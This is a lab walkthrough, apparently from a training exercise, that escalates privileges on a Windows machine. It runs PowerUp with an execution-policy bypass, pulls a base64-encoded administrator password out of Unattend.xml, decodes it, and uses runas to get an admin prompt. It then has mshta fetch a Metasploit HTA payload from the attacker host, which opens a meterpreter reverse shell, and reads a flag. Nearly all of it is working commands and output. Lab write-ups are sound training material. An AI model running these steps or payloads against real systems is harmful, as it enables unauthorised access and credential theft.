# Searching for passwords in Windows Configuration Files


```bash
# On the target machine,
C:\Users\student>whoami
priv-esc\student

C:\Users\student>cd .\Desktop\PowerSploit\Privesc\

C:\Users\student\Desktop\PowerSploit\Privesc>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.


# Powershell execution policy bypass
C:\Users\student\Desktop\PowerSploit\Privesc>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.



PS C:\Users\student\Desktop\PowerSploit\Privesc> . .\PowerUp.ps1
PS C:\Users\student\Desktop\PowerSploit\Privesc> Invoke-PrivescAudit


ModifiablePath    : C:\Users\student\AppData\Local\Microsoft\WindowsApps
IdentityReference : PRIV-ESC\student
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\student\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\student\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath
                    'C:\Users\student\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml   <- Unattend.xml is an nswer file for instllation
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files


# Read the file
PS C:\Users\student\Desktop\PowerSploit\Privesc> cat C:\Windows\Panther\Unattend.xml

# Discovered an administrator encoded password
~~~~~
  </FirstLogonCommands>
            <AutoLogon>
                <Password>
                    <Value>QWRtaW5AMTIz</Value>
                    <PlainText>false</PlainText>
                </Password>
~~~~~

# Decoding administrator password using Poweshell
PS C:\Users\student\Desktop\PowerSploit\Privesc> $password='QWRtaW5AMTIz'
PS C:\Users\student\Desktop\PowerSploit\Privesc> $password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
PS C:\Users\student\Desktop\PowerSploit\Privesc> echo $password
Admin@123     <- Decoded

# Runnning a command prompt as an administrator user using dexcover creditials
PS C:\Users\student\Desktop\PowerSploit\Privesc> runas.exe /user:administrator cmd
Enter the password for administrator:
Attempting to start cmd as user "PRIV-ESC\administrator" ...
PS C:\Users\student\Desktop\PowerSploit\Privesc>

# On new window
C:\Windows\system32>whoami
priv-esc\administrator
```

```bash
# Switch to Kali Machine
# Run the ht_server module to gain the meterpreter shell
# "This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell"
└─# msfconsole -q
msf6 > use exploit/windows/misc/hta_server
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/misc/hta_server) > 

msf6 exploit(windows/misc/hta_server) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.43.2:4444 
msf6 exploit(windows/misc/hta_server) > [*] Using URL: http://10.10.43.2:8080/GgcPmumAuARoPD0.hta    <- Generated payload
[*] Server started.
```
```bash
# On target machine
C:\Windows\system32>mshta.exe http://10.10.43.2:8080/GgcPmumAuARoPD0.hta


# This output on Kali
[*] Server started.
[*] 10.0.19.117      hta_server - Delivering Payload
[*] Sending stage (176198 bytes) to 10.0.19.117
[*] Meterpreter session 1 opened (10.10.43.2:4444 -> 10.0.19.117:49788) at 2025-07-17 12:43:24 +0530
```

```bash
# Find the flag
msf6 exploit(windows/misc/hta_server) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 


meterpreter > cd /
meterpreter > cd C:\\Users\\Administrator\\Desktop
meterpreter > dir
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2020-10-27 15:14:30 +0530  desktop.ini
100666/rw-rw-rw-  32    fil   2020-11-07 12:33:58 +0530  flag.txt


meterpreter > cat flag.txt
097ab83639dce0ab3429cb0349493f60
```
